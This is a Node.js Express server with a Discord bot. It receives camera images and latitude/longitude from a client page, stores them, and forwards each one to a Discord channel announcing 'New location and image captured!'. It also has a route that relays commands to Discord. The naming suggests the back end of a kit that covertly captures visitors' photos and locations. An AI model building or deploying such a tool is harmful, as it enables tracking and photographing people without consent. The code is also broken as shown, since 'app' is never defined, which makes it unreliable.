const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits } = require('discord.js');  // Updated import
require('dotenv').config();  // Load environment variables from .env file

const discordClient = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent, // Added to read message content
  ],
});

// Server Port
const PORT = process.env.PORT || 3000;

// Create directories if they don't exist
if (!fs.existsSync(path.join(__dirname, 'captured_images'))) {
    fs.mkdirSync(path.join(__dirname, 'captured_images'));
}
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse JSON requests
app.use(bodyParser.json({ limit: '10mb' }));

// Discord bot ready event
discordClient.once('ready', () => {
    console.log('Discord bot is ready!');
});

// Log in to Discord bot using the token from environment variables
discordClient.login(process.env.DISCORD_TOKEN)
    .then(() => {
        console.log('Bot logged in successfully!');
    })
    .catch(err => {
        console.error('Error logging in:', err.message);
    });

// Route to handle image and location data
app.post('/upload', (req, res) => {
    const { latitude, longitude, image } = req.body;

    // Save the image as a file
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const imageFilename = `image_${Date.now()}.png`;
    const imagePath = path.join(__dirname, 'captured_images', imageFilename);

    fs.writeFile(imagePath, base64Data, 'base64', (err) => {
        if (err) {
            return res.status(500).json({ message: 'Error saving image.' });
        }

        // Append location and image information to a JSON file
        const locationData = {
            timestamp: new Date().toISOString(),
            latitude: latitude,
            longitude: longitude,
            image: imageFilename
        };

        const logFilePath = path.join(__dirname, 'data', 'location_data.json');
        fs.appendFile(logFilePath, JSON.stringify(locationData) + ',\n', (err) => {
            if (err) {
                return res.status(500).json({ message: 'Error saving location data.' });
            }

            // Send the message to Discord with location info and image
            const message = `New location and image captured!\nLatitude: ${latitude}, Longitude: ${longitude}`;
            
            discordClient.channels.fetch(process.env.CHANNEL_ID)  // Use the channel ID from environment variable
                .then(channel => {
                    channel.send(message);
                    channel.send({ files: [imagePath] });  // Sends the captured image
                })
                .catch(console.error);

            res.status(200).json({ message: 'Image and location saved successfully!', latitude, longitude });
        });
    });
});

// Route to handle commands sent from the client
app.post('/send-command', (req, res) => {
    const { command } = req.body;
    if (command) {
        discordClient.channels.fetch(process.env.CHANNEL_ID)
            .then(channel => {
                channel.send(`Command received: ${command}`);
            })
            .catch(console.error);
        res.status(200).json({ message: 'Command sent to Discord bot.' });
    } else {
        res.status(400).json({ message: 'No command provided.' });
    }
});

// Start the server and listen on the correct network interface
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
